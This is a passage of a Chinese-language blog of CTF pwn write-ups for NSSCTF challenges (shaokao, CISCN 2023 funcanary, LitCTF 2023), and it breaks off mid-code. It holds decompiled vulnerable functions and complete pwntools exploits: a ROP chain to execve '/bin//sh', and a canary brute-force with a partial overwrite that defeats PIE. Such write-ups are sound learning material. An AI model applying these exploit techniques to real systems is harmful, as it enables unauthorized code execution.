class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;./shaokao&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:io.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:io.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:io.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:io.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:io.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:io.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :io.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28368</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">io=run()</span><br><span class="line">offset=<span class="number">40</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;3. 勇闯天涯\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;来几瓶？\n&#x27;</span>,<span class="string">b&#x27;-10000&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;：\n&#x27;</span>,p)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>算是非常简单的题目了</p><h1 id="CISCN-2023-初赛-funcanary"><a href="#CISCN-2023-初赛-funcanary" class="headerlink" title="[CISCN 2023 初赛]funcanary"></a>[CISCN 2023 初赛]funcanary</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653181.png" alt="image-20240509113441769" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_1243();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fork();                                <span class="comment">// 子进程</span></span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      wait(<span class="number">0LL</span>);                                <span class="comment">// 父进程</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);                          <span class="comment">// 子进程</span></span><br><span class="line">      sub_128A(<span class="string">&quot;welcome&quot;</span>, a2);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;have fun&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是父子进程的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_128A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x80</span>uLL);                        <span class="comment">// 爆破Canary</span></span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面会溢出0x10个字节，但显然要爆破Canary，而<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653182.png" alt="image-20240509113846870"></p><p>有个后门函数，但是要绕过Pie，直接覆盖尾巴3字节第四个字节爆破即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from <span class="class"><span class="keyword">struct</span> <span class="title">import</span> <span class="title">pack</span></span></span><br><span class="line"><span class="class"><span class="title">context</span>.<span class="title">log_level</span>=</span><span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;./service&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =lambda num=<span class="number">4096</span>:io.recv(num)</span><br><span class="line">ru  =lambda content,drop=False:io.recvuntil(content,drop)</span><br><span class="line">rl  =lambda :io.recvline()</span><br><span class="line">sla =lambda flag,content:io.sendlineafter(flag,content)</span><br><span class="line">sa  =lambda flag,content:io.sendafter(flag,content)</span><br><span class="line">sl  =lambda content:io.sendline(content)</span><br><span class="line">s   =lambda content:io.send(content)</span><br><span class="line">irt =lambda :io.interactive()</span><br><span class="line">tbs =lambda content:str(content).encode()</span><br><span class="line">leak=lambda name,addr :info(f<span class="number">&#x27;</span>&#123;name&#125;====&gt;&#123;hex(addr)&#125;<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">local=0</span></span><br><span class="line"><span class="string">def run():</span></span><br><span class="line"><span class="string">    if local:</span></span><br><span class="line"><span class="string">        return process(path)</span></span><br><span class="line"><span class="string">    return remote(&#x27;</span>node5.anna.nssctf.cn<span class="number">&#x27;</span>,<span class="number">29486</span>)</span><br><span class="line"></span><br><span class="line">def debug(duan=<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">io=run()</span><br><span class="line">def leak_canary():</span><br><span class="line">    canary=<span class="string">&quot;\x00&quot;</span></span><br><span class="line">    offset=<span class="number">0x68</span></span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> k in range(<span class="number">0xff</span>): </span><br><span class="line">            payload=<span class="string">&#x27;a&#x27;</span>*offset+canary+chr(k)</span><br><span class="line">            io.sendafter(<span class="string">&quot;welcome\n&quot;</span>,payload)</span><br><span class="line">            try:</span><br><span class="line">                a=io.recv(timeout=<span class="number">0.2</span>)</span><br><span class="line">                <span class="keyword">if</span> a==b<span class="string">&quot;have fun\n&quot;</span>:</span><br><span class="line">                    canary+=chr(k)</span><br><span class="line">                    print(canary)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line">catflag=<span class="number">0x0231</span></span><br><span class="line">canary=leak_canary()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">16</span>):</span><br><span class="line">        payload = b<span class="number">&#x27;</span>A<span class="number">&#x27;</span> * <span class="number">0x68</span> + bytes(canary) + b<span class="number">&#x27;</span>A<span class="number">&#x27;</span> * <span class="number">8</span> + p16(catflag)</span><br><span class="line">        io.send(payload)</span><br><span class="line">        <span class="meta">#pause()</span></span><br><span class="line">        a = io.recvuntil(<span class="string">&quot;welcome\n&quot;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">        print(a)</span><br><span class="line">        <span class="keyword">if</span> b<span class="string">&quot;welcome&quot;</span> in a:</span><br><span class="line">                catflag += <span class="number">0x1000</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> b<span class="string">&quot;NSSCTF&quot;</span> in a:</span><br><span class="line">            print(a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>但是远程打不通，不知道为什么，canary爆破不出来，很奇怪</p><h1 id="LitCTF-2023-狠狠的溢出涅"><a href="#LitCTF-2023-狠狠的溢出涅" class="headerlink" title="[LitCTF 2023]狠狠的溢出涅~"></a>[LitCTF 2023]狠狠的溢出涅~</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">91</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [rsp+6Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave your message:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(buf);                             <span class="comment">// 就一个显然\x00绕过</span></span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0x50</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ok,Message Received&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞很简单，strlen绕过即可，给了Libc，利用libc的ropchain即可</p><p>老规矩先puts出libc基址之后直接绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 